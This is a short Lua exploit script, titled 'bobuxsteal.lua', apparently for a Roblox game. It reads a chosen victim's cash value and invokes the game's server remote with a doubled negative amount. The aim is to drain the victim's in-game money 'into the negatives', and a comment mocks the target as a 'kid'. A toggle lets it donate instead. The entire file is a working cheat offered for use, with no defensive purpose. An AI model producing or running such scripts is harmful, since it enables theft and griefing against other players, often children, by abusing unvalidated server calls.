--// bobuxsteal.lua
-- services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- variables
local GOSNFT = ReplicatedStorage.Remotes.GOSNFT
local StealOrDonate = false --// true - donate, false - steal
local KidsName = ""

-- core
local amount = Players:FindFirstChild((StealOrDonate) and Players.LocalPlayer.Name or KidsName).leaderstats.Cash.Value; amount = math.floor(amount)
local args = {(StealOrDonate) and amount or -(amount * 2) --[[make sure they go poor or into the negatives LOL]], KidsName, -(2^31)}

GOSNFT:InvokeServer(unpack(args))
